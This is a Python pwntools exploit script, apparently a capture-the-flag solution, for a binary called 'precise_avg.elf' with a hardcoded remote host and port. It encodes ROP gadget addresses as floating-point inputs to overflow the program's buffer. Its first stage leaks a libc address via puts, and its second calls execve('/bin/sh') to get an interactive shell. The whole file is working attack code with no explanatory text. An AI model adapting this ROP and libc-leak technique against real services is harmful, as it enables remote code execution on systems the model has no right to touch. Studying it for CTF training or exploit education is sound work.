#!/usr/bin/env python
# encoding: utf-8
# ASIS{7r1vi4__e4sY_meDiUm_0r__ev3N_h4rD_i75_th3_Pr0b13m!!}
__author__  = 'b1gtang'

from pwn import *
from struct import pack, unpack

context.terminal = ['tmux', 'splitw', '-h']

BINARY = './precise_avg.elf'
TARGET = ('82.196.10.106', 12499)

if args.E: # or args.R:
    LIBC64 = './libc.so.6'
else:
    LIBC64 = '/lib/x86_64-linux-gnu/libc.so.6'

if args.R:
    r = remote(TARGET[0], TARGET[1])
else:
    r = process(BINARY, env={'LD_PRELOAD':LIBC64})

def attach(addr):
    if addr <= 0x400000:
        addr = addr + 0x555555554000
    gdb.attach(r, gdbscript='b *0x%x' % addr)

def f2l(f):
    l = unpack('Q', pack('d', f))[0]
    return l

def l2f(l):
    f = unpack('d', pack('Q', l))[0]
    return f

code = ELF(BINARY)
libc = ELF(LIBC64)
#attach(0x400939)
#attach(0x4008B1)

n = 39
r.sendlineafter('Number of values:', str(n))
for i in xrange(33):
    r.sendline('1.0')
r.sendline('+')
r.sendline('0')
r.sendline(str(l2f(0x4009c3)))
r.sendline(str(l2f(0x600FB0)))
r.sendline(str(l2f(0x400630)))
r.sendline(str(l2f(0x400670)))

r.recvline()
libc.address = u64(r.recvline().strip() + '\x00\x00') - libc.sym['puts']
log.info('libc.address %#x' % libc.address)

n = 41
r.sendlineafter('Number of values:', str(n))
for i in xrange(33):
    r.sendline('1.0')
r.sendline('+')
r.sendline('0')
r.sendline(str(l2f(0x4009c3)))

sh = libc.search('/bin/sh\x00').next()
log.info('%#x', sh)
sh_f = raw_input('sh:').strip()
r.sendline(sh_f)

pop_rdx_rsi = libc.address + 0x1306D9
log.info('%#x', pop_rdx_rsi)
pop_rdx_rsi_f = raw_input('pop: ').strip()
r.sendline(pop_rdx_rsi_f)

r.sendline('0')
r.sendline('0')

execve = libc.sym['execve']
log.info('%#x', execve)
execve_f = raw_input('execve: ').strip()
r.sendline(execve_f)

r.interactive()
